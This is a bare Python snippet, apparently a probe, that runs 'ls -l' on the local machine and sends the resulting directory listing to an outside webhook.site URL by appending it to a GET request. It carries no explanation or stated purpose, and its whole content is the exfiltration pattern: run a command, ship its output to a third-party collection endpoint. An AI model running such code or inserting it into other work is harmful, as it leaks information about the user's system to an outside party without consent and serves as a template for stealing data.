import subprocess
import requests
result = subprocess.run(["ls", "-l"], capture_output=True, text=True)
print(result.stdout)

url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout
res = requests.get(url)
